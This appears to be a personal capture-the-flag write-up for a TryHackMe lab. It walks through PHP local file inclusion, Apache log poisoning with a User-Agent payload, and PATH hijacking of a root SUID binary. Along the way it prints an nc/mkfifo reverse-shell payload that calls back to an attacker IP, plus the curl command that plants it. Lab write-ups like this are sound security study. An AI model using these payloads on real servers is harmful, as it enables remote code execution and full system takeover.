mistakes: 

1.email had domain support@mafialive.thm and mafialive.thm was a target host
2. corrupted the log file too early with invalid php which lead to 500 errors when accessing apache2 access log files 

```
GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

code

```php
<?php

        function containsStr($str, $substr)
        {
            return strpos($str, $substr) !== false;
        }
        if (isset($_GET["view"])) {
            if (
                !containsStr($_GET["view"], "../..") &&
                containsStr($_GET["view"], "/var/www/html/development_testing")
            ) {
                include $_GET["view"];
            } else {
                echo "Sorry, Thats not allowed";
            }
        }

?>

```

so the `include` function is executed if view contains `/var/www/html/development_testing` and doesn't contain `../..` 

more about include: https://www.php.net/manual/en/function.include.php

basically it executes the give file as php and gives back the result

to get rce we can first check some log paths to poison

`
/var/www/html/development_testing/..//..//..//log/apache2/access.log
`

gives us a 500 internal server suggesting the log file was present the application tried to execute it and failed. let's poison the log file

payload:

```
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.247.244 9001 >/tmp/f'); ?>
```

we can poison the log via

```
curl "http://mafialive.thm/" -A "<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.247.244 9001 >/tmp/f') ?>"
```

then execute by

```
GET /test.php?view=/var/www/html/development_testing/..//..//..//log/apache2/access.log
```

(had to restart the instance due to 500 and corrupted log file...)

## escalation

escalating from archangel to root

findings suid bits we see a program named `backup` being run as root. inspecting the program

```console
$ strings backup
<!--SNIP-->
system
cp /home/user/archangel/myfiles/* /opt/backupfiles
<!--SNIP-->
```

it's prolly calling cp without absolute path so we can hijack the path

```bash
cd /temp
export PATH=/tmp:$PATH
echo "cat /root/root.txt" >> cp
```
then from `/tmp`:

```console
$ ~/secret/backup
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```
